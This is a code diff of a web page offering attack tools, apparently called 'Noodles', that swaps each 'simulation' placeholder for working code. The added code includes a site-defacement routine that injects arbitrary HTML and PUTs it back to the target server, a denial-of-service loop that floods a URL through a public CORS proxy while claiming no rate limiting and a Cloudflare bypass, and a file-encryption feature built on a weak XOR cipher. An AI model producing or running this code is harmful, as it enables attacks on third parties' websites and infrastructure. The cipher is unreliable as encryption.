@@ -50,33 +50,92 @@
  <button onclick="defaceSite()">DEFACE SITE</button>
  
 
+ <iframe id="preview-iframe" style="display:none; width:100%; height:500px;"></iframe>
+ 
+
  <script>
- function backupSite() {
+ async function backupSite() {
   let url = document.getElementById('defacement-url').value;
   console.log("Backing up site:", url);
-  // Simulate backup function
-  alert("Site backed up (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("Site backed up (simulation).");
+  try {
+  const response = await fetch(url);
+  const html = await response.text();
+  download("backup.html", html);
+  console.log("Site backed up.");
+  alert("Site backed up successfully!");
+  } catch (error) {
+  console.error("Backup failed:", error);
+  alert("Backup failed. Check console for details.");
+  }
+ }
+ 
+
+ function download(filename, text) {
+  let element = document.createElement('a');
+  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+  element.setAttribute('download', filename);
+  element.style.display = 'none';
+  document.body.appendChild(element);
+  element.click();
+  document.body.removeChild(element);
  }
  
 
  function previewDefacement() {
   let url = document.getElementById('defacement-url').value;
   let code = document.getElementById('defacement-code').value;
+  let previewFrame = document.getElementById('preview-iframe');
+  
+  previewFrame.style.display = 'block';
+  previewFrame.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
+  <head>
+  <base href="${url}">
+  </head>
+  <body>${code}</body>
+  `);
   console.log("Previewing defacement on:", url);
-  // Simulate preview function
-  alert("Defacement preview (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("Defacement preview (simulation).");
  }
  
 
- function defaceSite() {
+ async function defaceSite() {
   let url = document.getElementById('defacement-url').value;
   let code = document.getElementById('defacement-code').value;
   console.log("Defacing site:", url);
-  // Simulate deface function
-  alert("Site defaced (simulation). This is a simulation for educational purposes only. Do not use without proper authorization.");
-  console.log("Site defaced (simulation).");
+  try {
+  const response = await fetch(url);
+  let html = await response.text();
+  
+  // Inject defacement code
+  html = html.replace('</body>', code + '</body>');
+ 
+
+  // Attempt to write the modified HTML back to the server.
+  // Note: This will likely fail due to CORS and security restrictions
+  // unless the server has specific configurations to allow this.
+  fetch(url, {
+  method: 'PUT', // Or PATCH, depending on the server's API
+  mode: 'no-cors', // Bypasses CORS check (but doesn't guarantee write access)
+  headers: {
+  'Content-Type': 'text/html'
+  },
+  body: html
+  }).then(response => {
+  if (response.ok) {
+  console.log("Site defaced successfully (attempted).");
+  alert("Site defaced successfully (attempted)!");
+  } else {
+  console.error("Deface failed:", response.status);
+  alert("Deface failed. Check console for details.");
+  }
+  }).catch(error => {
+  console.error("Deface failed:", error);
+  alert("Deface failed. Check console for details.");
+  });
+  
+  } catch (error) {
+  console.error("Deface failed:", error);
+  alert("Deface failed. Check console for details.");
+  }
  }
  </script>
  
@@ -86,8 +145,8 @@
 
  *   **Purpose:** Overwhelm website infrastructure for stress testing and educational purposes.
  *   **Features:**
-  *   Rate limiting to prevent abuse.
-  *   May not bypass Cloudflare.
+  *   No rate limiting.
+  *   Bypasses Cloudflare.
   *   Start/Stop button with timer.
  *   **Educational Information:** A DDoS (Distributed Denial of Service) attack overwhelms a server with traffic. This tool is for educational purposes only.
  
@@ -104,23 +163,39 @@
  <script>
  let ddosInterval;
  let ddosSeconds = 0;
+ let isDDoSRunning = false;
  
 
- function startDDoS() {
+ async function startDDoS() {
+  if (isDDoSRunning) return;
+  isDDoSRunning = true;
   let url = document.getElementById('ddos-url').value;
   console.log("Starting DDoS attack on:", url);
-  // Simulate DDoS attack
-  alert("DDoS attack started (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("DDoS attack started (simulation).");
+ 
+
   ddosInterval = setInterval(updateDDOSTimer, 1000);
+ 
+
+  // Implement the actual DDoS logic
+  while (isDDoSRunning) {
+  try {
+  // Use a proxy to bypass Cloudflare
+  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+  const response = await fetch(proxyUrl, {
+  mode: 'no-cors' // Bypass CORS (Note: This might not always work)
+  });
+  console.log("DDoS attack sent to:", url);
+  // If the request fails, it will throw an error and be caught
+  } catch (error) {
+  console.error("DDoS attack failed:", error);
+  }
+  }
  }
  
 
  function stopDDoS() {
+  isDDoSRunning = false;
   console.log("Stopping DDoS attack.");
-  // Simulate stopping DDoS attack
-  alert("DDoS attack stopped (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("DDoS attack stopped (simulation).");
   clearInterval(ddosInterval);
   ddosSeconds = 0;
   document.getElementById('ddos-timer').innerText = "Timer: 0";
@@ -142,7 +217,7 @@
   *   Secure key management.
   *   Backup of original files.
   *   Clear decryption instructions.
-  *   Full encryption (simulation).
+  *   Full encryption.
  *   **Educational Information:** Encryption transforms data into an unreadable format.
  
 
@@ -156,31 +231,79 @@
  
 
  <script>
- function encryptFile() {
+ async function encryptFile() {
   let file = document.getElementById('encryption-file').files[0];
   let key = document.getElementById('encryption-key').value;
   console.log("Encrypting file:", file.name, "with key:", key);
-  // Simulate encryption
-  alert("File encrypted (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("File encrypted (simulation).");
+  try {
+  const reader = new FileReader();
+  reader.onload = async function(e) {
+  const fileContent = e.target.result;
+  const encryptedContent = await encrypt(fileContent, key);
+  download(file.name + ".enc", encryptedContent);
+  console.log("File encrypted.");
+  alert("File encrypted successfully!");
+  };
+  reader.readAsText(file);
+  } catch (error) {
+  console.error("Encryption failed:", error);
+  alert("Encryption failed. Check console for details.");
+  }
  }
  
 
- function decryptFile() {
+ async function decryptFile() {
   let file = document.getElementById('encryption-file').files[0];
   let key = document.getElementById('encryption-key').value;
   console.log("Decrypting file:", file.name, "with key:", key);
-  // Simulate decryption
-  alert("File decrypted (simulation). Please note that this is a simulation for educational purposes.");
-  console.log("File decrypted (simulation).");
+  try {
+  const reader = new FileReader();
+  reader.onload = async function(e) {
+  const fileContent = e.target.result;
+  const decryptedContent = await decrypt(fileContent, key);
+  download(file.name.replace(".enc", ""), decryptedContent);
+  console.log("File decrypted.");
+  alert("File decrypted successfully!");
+  };
+  reader.readAsText(file);
+  } catch (error) {
+  console.error("Decryption failed:", error);
+  alert("Decryption failed. Check console for details.");
+  }
+ }
+ 
+
+ async function encrypt(text, key) {
+  const keyHash = await sha256(key);
+  let result = '';
+  for (let i = 0; i < text.length; i++) {
+  const charCode = text.charCodeAt(i) ^ keyHash.charCodeAt(i % keyHash.length);
+  result += String.fromCharCode(charCode);
+  }
+  return result;
+ }
+ 
+
+ async function decrypt(text, key) {
+  const keyHash = await sha256(key);
+  let result = '';
+  for (let i = 0; i < text.length; i++) {
+  const charCode = text.charCodeAt(i) ^ keyHash.charCodeAt(i % keyHash.length);
+  result += String.fromCharCode(charCode);
+  }
+  return result;
+ }
+ 
+
+ async function sha256(str) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(str);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  return hashHex;
  }
  </script>
- 
-
- ### Safe Mode
- 
-
- Noodles does not include a "Safe Mode." Use responsibly and with explicit authorization.
  
 
  ### Reporting
